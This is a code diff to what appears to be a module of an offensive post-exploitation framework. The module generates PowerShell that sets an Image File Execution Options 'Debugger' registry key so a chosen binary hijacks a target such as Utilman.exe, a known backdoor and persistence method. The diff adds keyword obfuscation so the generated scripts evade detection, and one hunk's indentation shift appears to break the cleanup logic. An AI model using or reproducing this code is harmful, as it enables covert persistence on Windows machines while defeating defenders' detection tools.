@@ -100,8 +100,9 @@ class Module(object):
         if cleanup.lower() == 'true':
             # the registry command to disable the debugger for Utilman.exe
             script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s';'%s debugger removed.'" %(targetBinary, targetBinary)
-            if obfuscate:
-                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+                script = helpers.keyword_obfuscation(script, self.mainMenu)
+        if obfuscate:
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
             return script
         
         if listenerName != '':
@@ -138,6 +139,7 @@ class Module(object):
         else:
             # the registry command to set the debugger for the specified binary to be the binary path specified
             script = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '"+triggerBinary+"';'"+targetBinary+" debugger set to "+triggerBinary+"'"
+            script = helpers.keyword_obfuscation(script, self.mainMenu)
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
 
